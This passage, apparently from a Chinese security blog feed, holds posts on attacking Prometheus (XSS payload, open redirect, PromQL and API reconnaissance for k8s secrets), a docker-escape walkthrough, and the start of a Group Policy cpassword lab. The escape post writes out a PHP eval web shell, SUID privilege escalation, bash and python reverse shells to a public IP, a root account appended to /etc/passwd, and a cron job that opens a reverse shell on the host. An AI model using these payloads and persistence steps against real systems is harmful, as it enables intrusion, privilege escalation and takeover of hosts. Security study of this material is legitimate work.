<td align="center"><a href="https://prometheus.io/docs/instrumenting/clientlibs/">client libraries</a></td>
<td align="center">客户端库，用于检测应用程序代码</td>
</tr>
<tr>
<td align="center"><a href="https://github.com/prometheus/pushgateway">push gateway</a></td>
<td align="center">在不支持pull 拉取监控数据的场景中，可通过部署Pushgateway的方式，由监控源主动上报到Promtehus</td>
</tr>
<tr>
<td align="center"><a href="https://prometheus.io/docs/instrumenting/exporters/">exporters</a></td>
<td align="center">监控客户端，用于收集各类监控数据，不同的监控需求由不同的exporter处理，如node-exporter、mysql-exporter、blackbox-exporter等。</td>
</tr>
<tr>
<td align="center"><a href="https://github.com/prometheus/alertmanager">alertmanager</a></td>
<td align="center">独立组件，用于处理告警信息</td>
</tr>
<tr>
<td align="center">various support tools</td>
<td align="center">其他各种支持工具</td>
</tr>
<tr>
<td align="center"><a href="https://prometheus.io/docs/prometheus/latest/querying/basics/">PromQL</a></td>
<td align="center">官方提供的用于数据查询的功能性查询语言</td>
</tr>
</tbody></table>
<h2 id="2-历史漏洞"><a href="#2-历史漏洞" class="headerlink" title="2.历史漏洞"></a>2.历史漏洞</h2><h3 id="1-CVE-2019-3826"><a href="#1-CVE-2019-3826" class="headerlink" title="1. CVE-2019-3826"></a>1. CVE-2019-3826</h3><p>这是一个存储型 <code>XSS</code> 漏洞, 影响版本为:<code> 2.7.1</code> 之前。</p>
<p>这个利用有个前提条件: 需要开启<code>enable query history</code>,也就是记录查询历史需要开启</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202302201057065.png" alt="image-20220927165327558"></p>
<p>这个前端就可以开启，而且默认启用。</p>
<p>之后攻击者构造一条特殊的查询语句，<code>test&#123;test=&quot;&lt;script&gt;alert(/xss/)&lt;/script&gt;&quot;&#125;</code>,执行一下，</p>
<p>之后在查询中输入一个可以让这条记录出现的单词才能触发,比如说<code>t</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202302201057517.png" alt="image-20220927180430311"></p>
<p>各位看官看到这里，接下来可能会想怎么组合利用了。但是啊，凡是都有个但是，这个<code>XSS</code>漏洞触发原因是**因为开启<code>history</code>后，之后的查询输入会高亮提示 **，问题就出现在这里，存储和渲染时未做任何过滤 <code>web/ui/static/js/graph/index.js</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202302201057850.png" alt="image-20220927180843214"></p>
<p>然后再说说为啥会是<code>存储型</code>，因为这个查询历史存储在了浏览器的 <code>Local Storage</code>，这你让我弹谁？？？因吹斯汀</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202302201058681.png" alt="image-20220927181006925"></p>
<h3 id="2-CVE-2021-29622"><a href="#2-CVE-2021-29622" class="headerlink" title="2. CVE-2021-29622"></a>2. CVE-2021-29622</h3><p>这是一个重定向漏洞，官方描述</p>
<blockquote>
<p>  在 2.23.0 中，Prometheus 将其默认 UI 更改为 New ui。为确保无缝转换，URL 以 <code>/new</code> 为前缀重定向到 <code>/</code>。由于代码中的错误，攻击者有可能在 <code>/new</code> 端点中制作一个可以重定向到任何其他 URL 的 URL。如果用户使用特制地址访问 prometheus 服务器，他们可以被重定向到任意 URL。</p>
<p>  该问题已在 2.26.1 和 2.27.1 版本中修复。在 2.28.0 中，<code>/new</code> 端点将被完全删除。修补方案是通过 Prometheus 前面的反向代理禁用对 <code>/new</code> 的访问。</p>
</blockquote>
<p><code>git checkout v2.24.0</code>，切换有漏洞的分支,看代码 <code>web/web.go</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202302201058832.png" alt="image-20220927162146823"></p>
<p>emmmm，没啥好说的，当 url 为 <code>http://127.0.0.1:19090/new/newhttps://www.baidu.com</code> 这种时，<code>p</code>就等于 <code>/newhttps://www.baidu.com</code>,然后去除<code>/new</code>前缀,使用 path 包组合成 url 进行重定向。</p>
<h4 id="CodeQL-分析"><a href="#CodeQL-分析" class="headerlink" title="CodeQL 分析"></a>CodeQL 分析</h4><p>官方 codeql 中关于go的规则中没有重定向测试用例，只有写好的库(<code>lib/semmle/go/security/OpenUrlRedirect.qll</code>这个调用运行跑不出该漏洞，只能跑出后两个)，其他语言存在相关的测试用例，模仿python 的重定向测试写一个。</p>
<p><code>UrlRedirectQuery.qll</code> 内容如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">import go</span><br><span class="line"></span><br><span class="line">import semmle.go.security.UrlConcatenation</span><br><span class="line"></span><br><span class="line">import semmle.go.security.OpenUrlRedirectCustomizations::OpenUrlRedirect</span><br><span class="line">abstract <span class="class"><span class="keyword">class</span> <span class="title">Sanitizer</span> <span class="title">extends</span> <span class="title">DataFlow</span>:</span>:Node &#123; &#125;</span><br><span class="line">abstract deprecated <span class="class"><span class="keyword">class</span> <span class="title">SanitizerGuard</span> <span class="title">extends</span> <span class="title">DataFlow</span>:</span>:BarrierGuard &#123; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * A data-flow configuration for reasoning about unvalidated URL redirections.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Configuration</span> <span class="title">extends</span> <span class="title">TaintTracking</span>:</span>:Configuration &#123;</span><br><span class="line">    Configuration() &#123; this = <span class="string">&quot;UrlRedirect&quot;</span> &#125;</span><br><span class="line"></span><br><span class="line">    override predicate isSource(DataFlow::Node source) &#123; source instanceof Source &#125;</span><br><span class="line"></span><br><span class="line">    override predicate isSink(DataFlow::Node sink) &#123; sink instanceof Sink &#125;</span><br><span class="line"></span><br><span class="line">    override predicate isSanitizer(DataFlow::Node node) &#123; node instanceof Sanitizer &#125;</span><br><span class="line"></span><br><span class="line">    deprecated override predicate isSanitizerGuard(DataFlow::BarrierGuard guard) &#123;</span><br><span class="line">        guard instanceof SanitizerGuard</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>UrlRedirect.ql</code> 内容如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">import go <span class="comment">/* 每个查询都以一个或多个import语句开始。 */</span></span><br><span class="line">import UrlRedirectQuery  <span class="comment">/* 引用刚才的库文件/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">/* DataFlow 模块 负责实现代码的数据流跟踪功能，即实现整个的调用栈分析。 */</span></span><br><span class="line"><span class="comment">/* 定义变量  */</span></span><br><span class="line">from Configuration config, DataFlow::PathNode source, DataFlow::PathNode sink </span><br><span class="line"></span><br><span class="line">where config.hasFlowPath(source, sink)</span><br><span class="line">select sink.getNode(), source, sink,<span class="string">&quot;Untrusted URL redirection due to $@.&quot;</span>, source.getNode(),</span><br><span class="line"><span class="string">&quot;user-provided value&quot;</span></span><br></pre></td></tr></table></figure>

<p>结果如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202302201058129.png" alt="image-20221013145923377"></p>
<p>第一个就是我们刚才分析的漏洞,另外两个 <code>subpath</code> 虽然可控，但分析过后确认为误报</p>
<h2 id="3-metrics"><a href="#3-metrics" class="headerlink" title="3.metrics"></a>3.metrics</h2><blockquote>
<p>  Metrics是一款监控指标的度量类库，提供了许多工具帮助开发者来完成各项数据的监控。</p>
</blockquote>
<p>Prometheus Server 默认会从 <code>/metrics</code> api 中拉取数据，指标数据样本示例:</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202302201058264.png" alt="image-20220926171326026"></p>
<blockquote>
<p>  第一个# 是指标的说明介绍，</p>
<p>  第二个# 代表指标的类型，此为必须项且格式固定，TYPE+指标名称+类型</p>
<p>  go_gc_duration_seconds 为指标名称，{}里面为标签，它标明了当前指标样本的特征和维度，最后面的数值则是该样本的具体值</p>
</blockquote>
<h2 id="4-攻击利用"><a href="#4-攻击利用" class="headerlink" title="4.攻击利用"></a>4.攻击利用</h2><p>Prometheus 的各种服务在 2.24.0 版本之前都是允许任何人访问的，官方认为 Prometheus 抓取的各种指标数字不是敏感数据，比如描述 CPU 负载或发送到服务的请求数量等值，对于攻击者来说完全无用，因此Prometheus整体只专注于开发和监控相关的功能。</p>
<p>2.24.0 才出现认证相关的功能，但公网上许多使用了Prometheus的组织还未启用这些功能,还是存在大量的未授权的Prometheus服务。</p>
<h3 id="1-可利用接口"><a href="#1-可利用接口" class="headerlink" title="1.可利用接口"></a>1.可利用接口</h3><p>下面列举一些可能存在利用的点</p>
<ul>
<li><p><strong>&#x2F;api&#x2F;v1&#x2F;status&#x2F;config</strong></p>
<p>这里会泄露告警&#x2F;数据获取服务的地址，访问用户名等。令人不爽的是，Prometheus 会使用 <secret> 占位符替换掉密码等一些敏感信息。<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202302201058734.png" alt="image-20221010163836969"></p>
<p>ps: 这里的 <secret> 只会替换一些官方定义好的字段，如果配置人员将密码信息等写在了 url 中</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202302201058666.png" alt="image-20221017112811908"></p>
<p>Prometheus并不会对这些进行处理，虽然概率有点小，但找到就是赚。</p>
<p>如果监控了 k8s 服务，config 中会显示 k8s 认证的相关信息</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202302201059749.png" alt="image-20221017111516349"></p>
<p>这里直接告诉我们 k8s认证 token 和证书的位置，如果能打下这台机器，后续横向就很简单了。</p>
</li>
<li><p>**&#x2F;api&#x2F;v1&#x2F;targets **</p>
<p>监控的各种服务，通过这个 api 我们可以获取目标的其他资产机器地址，标签等</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202302201059634.png" alt="image-20221010165510417"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202302201059778.png" alt="image-20221010165554239"></p>
<p>​	比如这个，直接为我们提供了 178 个服务的信息，为后期的内网横向提供非常不错的帮助，而且还不用扫描，安全隐蔽。如果运气够好，也许还能找到 k8s 的用户名、密码信息、环境变量等。</p>
<p>​	基于 GCE 服务发现时，可能会泄露机器的用户名、ssh公钥，这里可以尝试发送钓鱼邮件，进一步利用。<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202302201059594.png" alt="image-20221018154630440"></p>
<p>​	基于AWS EC2的服务发现，我们可以很轻松的拿到机器使用的系统镜像、运行实例的地区、aws 账户 id、实例的网络地址等等信息</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202302201059593.png" alt="image-20221018155931705"> </p>
</li>
<li><p><strong>管理员接口</strong></p>
</li>
</ul>
<p>访问 <code>/api/v1/status/flags</code>，如果 <code>web.enable-lifecycle</code> 为 true，那么我们就可以关闭	Prometheus服务，<code>web.enable-admin-api</code>开启则可以删除监控的数据。</p>
<h3 id="2-PromQL"><a href="#2-PromQL" class="headerlink" title="2.PromQL"></a>2.PromQL</h3><p>Prometheus 提供了一种称为 PromQL（Prometheus Query Language）的功能性查询语言，让用户可以实时选择和聚合时间序列数据。</p>
<p>下面是从网络上收集的一些查询语句</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 提供有关每个Kubernetes 节点的信息: 云供应商的名称、产品名称</span><br><span class="line">node_dmi_info</span><br><span class="line"></span><br><span class="line"># 提供网络相关信息</span><br><span class="line">node_network_info&#123;device=~&#x27;eth.+&#x27;&#125;</span><br><span class="line"></span><br><span class="line"># k8s 每个组件的版本信息，git提交和构建日期</span><br><span class="line">kubernetes_build_info</span><br><span class="line"></span><br><span class="line"># k8s 集群的负载均衡器信息</span><br><span class="line">kube_service_info * on (service) group_left group by (service,type) (kube_service_spec_type&#123;type=&quot;LoadBalancer&quot;&#125;)</span><br><span class="line"></span><br><span class="line"># k8s 节点信息</span><br><span class="line">kube_node_info</span><br><span class="line"></span><br><span class="line"># k8s 中入口控制器的 URL 路径和相关服务的信息等</span><br><span class="line">kube_ingress_info</span><br><span class="line"></span><br><span class="line"># k8s pods 信息</span><br><span class="line">kube_pod_info</span><br><span class="line"># pods 信息与工作负载关联</span><br><span class="line">kube_pod_info * on(namespace,pod) group_left(owner_name) kube_pod_owner</span><br><span class="line"># pods 中的容器信息</span><br><span class="line">kube_pod_container_info</span><br><span class="line"></span><br><span class="line"># k8s 集群的命名空间、节点和Secret名称</span><br><span class="line">kube_secret_info</span><br><span class="line"># 获取SecreS中注解相关信息，可能存在一些敏感信息</span><br><span class="line">kube_secret_annotations&#123;kubectl_kubernetes_io_last_applied_configuration != &quot;&quot;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="3-总结"><a href="#3-总结" class="headerlink" title="3.总结"></a>3.总结</h3><p>攻防中最重要的一步就是尽可能多地收集与目标有关的信息，虽然 Prometheus 本身没有可以利用的点，但我们却可以从它所监控的服务信息中获取一些可能有用数据。这些数据不仅仅可以作为后渗透横向使用，还可以用来伪造信息进行钓鱼。</p>
<h2 id="5-参考"><a href="#5-参考" class="headerlink" title="5.参考"></a>5.参考</h2><p><a href="https://jfrog.com/blog/dont-let-prometheus-steal-your-fire/">https://jfrog.com/blog/dont-let-prometheus-steal-your-fire/</a></p>
<p><a href="https://sysdig.com/blog/exposed-prometheus-exploit-kubernetes-kubeconeu/">https://sysdig.com/blog/exposed-prometheus-exploit-kubernetes-kubeconeu/</a></p>
]]></content>
      <categories>
        <category>漏洞分析 - CNCF</category>
      </categories>
      <tags>
        <tag>漏洞分析</tag>
        <tag>CNCF</tag>
      </tags>
  </entry>
  <entry>
    <title>简单dockers逃逸学习</title>
    <url>/2020/08/04/%E7%AE%80%E5%8D%95docker%E9%80%83%E9%80%B8%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h2 id="1-目标界面"><a href="#1-目标界面" class="headerlink" title="1. 目标界面"></a>1. 目标界面</h2><p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/1.png"></p>
<p>搞半天，没进去。。。。</p>
<p>经过提示，了解到了一句话执行的原理，</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;cmd&quot;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>一句话在每次执行时，接收变量cmd传进去的参数 <code>cmd=phpinfo(); </code> 使用eval函数执行 phpinfo(); 命令。</p>
<p>了解后就是猜参数名的过程。</p>
<h2 id="2-提权"><a href="#2-提权" class="headerlink" title="2. 提权"></a>2. 提权</h2><p>连上shell后， <code>whoami</code> 查看为www-data权限，</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/2.png"></p>
<p>通过uname -a 和 cat &#x2F;etc&#x2F;*-release 查看内核版本，没有提权exp</p>
<p>!<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/4.png"></p>
<p><a href="https://www.anquanke.com/post/id/86979">利用可执行文件SUID</a></p>
<p>通过命令查看</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">find / -user root -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/3.png"></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">touch</span> suid <span class="comment"># 也可以不用创建，只要查找的文件真实存在即可</span></span><br><span class="line">find suid -<span class="built_in">exec</span> <span class="built_in">whoami</span> \;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/5.png"></p>
<h2 id="3-反弹shell-，以及获取完全交互式shell"><a href="#3-反弹shell-，以及获取完全交互式shell" class="headerlink" title="3. 反弹shell ，以及获取完全交互式shell"></a>3. 反弹shell ，以及获取完全交互式shell</h2><p>公网nc 监听 端口</p>
<p>bash 反弹 </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/公网ip/端口 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p>失败。。。</p>
<p>使用 python 反弹shell 到公网</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;公网ip&quot;,监听的端口));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-p&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure>

<p>保存为shll.sh ,之后执行</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/6.png"></p>
<p>到这里，反弹来的shell还有些问题：</p>
<ul>
<li><p>一些命令如su和ssh，需要一个正确的终端才能运行</p>
</li>
<li><p>通常不显示STDERR</p>
</li>
<li><p>无法正常使用vim等文本编辑器</p>
</li>
<li><p>没有完成标签</p>
</li>
<li><p>没有向上箭头使用历史</p>
</li>
<li><p>没有jobcontrol等</p>
<p>接下来使用python获取完全交互式shell</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">接下来在公网的机器上执行</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">python -c <span class="string">&quot;import pty; pty.spawn([&#x27;/bin/bash&#x27;,&#x27;-p&#x27;])&quot;</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启用python交互式</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">把它丢到后台挂起</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ctrl + z</span>   </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重置<span class="built_in">stty</span>，也就意味着你看不到输入的内容</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">stty</span> raw -<span class="built_in">echo</span></span>  </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">把后台挂起的程序调回前台 ，命令不显示</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">fg</span></span>  </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">完全刷新终端屏幕</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">回车 ，再回车 两次</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">reset</span>  </span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ctrl + c</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">接下来设置环境变量，根据第一步得到的环境变量来设置</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">export</span> SHELL=bash</span>   </span><br></pre></td></tr></table></figure>

<p>完美了,但是反弹的shell并不是root 用户，接下来执行</p>
<p>find suid -exec &#x2F;bin&#x2F;bash -p ;</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/9.png"></p>
</li>
</ul>
<h2 id="4-docker-逃逸"><a href="#4-docker-逃逸" class="headerlink" title="4. docker 逃逸"></a>4. docker 逃逸</h2><p>  使用 <code>ls -alh /.dockerenv </code> 判断服务器是否为docker环境, 非docker环境是没有的</p>
<p>  <img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/7.png"></p>
<p>这是没有docker的</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/13.png"></p>
<p>或者使用<code>cat /proc/1/cgroup</code>  查看系统进程的cgroup信息</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/8.png"></p>
<p>这是没有的</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/14.png"></p>
<p><code>fdisk -l</code> 查看磁盘文件</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/10.png"></p>
<p>新建一个目录, 将&#x2F;dev&#x2F;vda1挂载至新建的目录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir abc</span><br><span class="line">mount /dev/vda1 abc</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/11.png"></p>
<p>充满波折，不懂。。。</p>
<p>换个方法，</p>
<p>使用 &#x2F;etc&#x2F;passwd 创建root用户，</p>
<p>首先，使用perl语言生成带有盐值的密码：</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">perl -le <span class="string">&#x27;print crypt(&quot;password@123&quot;,&quot;addedsalt&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>

<p>然后执行下面这条命令，成功将test用户的信息加入 &#x2F;etc&#x2F;passwd 文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &quot;test:advwtv/9yU5yQ:0:0:User_like_root:/root:/bin/bash&quot; &gt;&gt;/etc/passwd</span><br></pre></td></tr></table></figure>

<p>su test 切换过去</p>
<p>再执行 mount  &#x2F;dev&#x2F;vda1 abc</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/12.png"></p>
<p>现在能查看宿主机文件，接下来逃逸到宿主机</p>
<p>通过写入计划任务到宿主机</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &#x27;* * * * * bash -i &gt;&amp; /dev/tcp/公网ip/端口 0&gt;&amp;1&#x27; &gt;&gt; abc/var/spool/cron/root</span><br></pre></td></tr></table></figure>

<p>将python 反弹的脚本写进去，同样gg</p>
<p>最终，直接将反弹shell的脚本，写入宿主机的目录下 </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim abc/root/shell.sh </span><br></pre></td></tr></table></figure>

<p>之后，赋予权限，直接执行反弹回shell</p>
]]></content>
      <categories>
        <category>docker逃逸</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
        <tag>docker逃逸</tag>
      </tags>
  </entry>
  <entry>
    <title>组策略提权实验</title>
    <url>/2021/01/16/%E7%BB%84%E7%AD%96%E7%95%A5%E6%8F%90%E6%9D%83%E5%AE%9E%E9%AA%8C/</url>
    <content><![CDATA[<blockquote>
<p>管理员在域中新建一个组策略后,操作系统会自动在SYSVO共享目录中生成一个XML文件，即<code>Groups.xml</code>,该文件中保存了该组策略更新后的密码。</p>
</blockquote>
<h2 id="1-组策略基本介绍"><a href="#1-组策略基本介绍" class="headerlink" title="1. 组策略基本介绍"></a>1. 组策略基本介绍</h2><p>组策略可以控制用户帐户和计算机帐户的工作环境。它提供了操作系统、应用程序和活动目录中用户设置的集中化管理和配置。有本机组策略和域的组策略。本机组策略用于计算机管理员统一管理本机以及所有用户，域内的组策略用于域管统一管理域内的所有计算机以及域用户。 在本文中侧重点讲的是域内的组策略，借机学一下域环境搭建</p>
<h2 id="2-SYSVOL-漏洞-MS14-025"><a href="#2-SYSVOL-漏洞-MS14-025" class="headerlink" title="2. SYSVOL 漏洞(MS14-025)"></a>2. SYSVOL 漏洞(MS14-025)</h2><p>SYSVOL是活动目录里面的一个用于存储域公共文件服务器副本的共享文件夹，在域中的所有域控制器之间进行复制。SYSVOL 文件夹是在安装活动目录时自动创建的，主要用来存放登录脚本、组策略数据及其他域控制器需要的域信息等。SYSVOL 在所有经过身份验证的域用户或者域信任用户具有读权限的活动目录的域范围内共享。整个SYSvOL 目录在所有的域控制器中是自动同步和共享的，所有的域策略均存放在C:\Windows\SYSVOL\DOMAIN\Policies 目录中。</p>
<p>在一般的域环境中,所有机器都是脚本化批量部署的,数据量通常很大。为了方便地对所有的机器进行操作,网络管理员往往会使用域策略进行统一的配置和管理。大多数组织在创建域环境后，会要求加人域的计算机使用域用户密码进行登录验证。为了保证本地管理员密码的安全性，这些组织的网络管理员往往会修改本地管理员密码。但是当通过组策略统一修改密码，虽然密码强度会有所提高，这就造成了所有机器的本地管理员密码是相同的。攻击者获得了一台机器的本地管理员密码,就相当于获得了整个域中所有机器的本地管理员密码。</p>
<p>在域中，存在一个默认的共享路径：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">\\&lt;DOMAIN&gt;\SYSVOL\&lt;DOMAIN&gt;\</span><br></pre></td></tr></table></figure>

<p>所有域内主机都能访问，里面保存组策略相关数据，包含登录脚本配置文件等。</p>
<p>例如，测试主机所在域为test.yhy，可访问共享文件夹<code>\\test.yhy\SYSVOL\test.yhy</code>，如下图：</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220084350.png" alt="image-20210116111851931"></p>
<p>在早期的版本，某些组策略首选项可以存储加密过的密码，加密方式为AES 256，虽然目前AES 256很难被攻破，但是微软选择公开了私钥，地址： <a href="https://msdn.microsoft.com/en-us/library/cc422924.aspx%E3%80%82">https://msdn.microsoft.com/en-us/library/cc422924.aspx。</a></p>
<p>![image-20210116111342068](&#x2F;Users&#x2F;yhy&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20210116111342068.png)</p>
<p>如下几个组策略首选项文件中会存在可选的密码cpassword 属性:</p>
<ul>
<li><p>Groups\Groupsx.xml</p>
</li>
<li><p>Services\Services.xml</p>
</li>
<li><p>ScheduledTasks\ScheduledTasks.xml</p>
</li>
<li><p>Printers\Printers.xml</p>
</li>
<li><p>Drives\Drives.xml</p>
</li>
<li><p>DataSources\DataSources.xml</p>
</li>
</ul>
<h2 id="3-漏洞复现"><a href="#3-漏洞复现" class="headerlink" title="3. 漏洞复现"></a>3. 漏洞复现</h2><h3 id="3-1-域环境搭建"><a href="#3-1-域环境搭建" class="headerlink" title="3.1 域环境搭建"></a>3.1 域环境搭建</h3><h4 id="3-1-1-环境要求"><a href="#3-1-1-环境要求" class="headerlink" title="3.1.1 环境要求"></a>3.1.1 环境要求</h4><p>环境：Windows Server 2008R2 </p>
<p>网络：NAT模式</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220084407.png" alt="image-20210116112955314"></p>
<p>更改管理员Administrator 密码为强密码，例如：test.yhy@123</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220084412.png" alt="image-20210116114025566"></p>
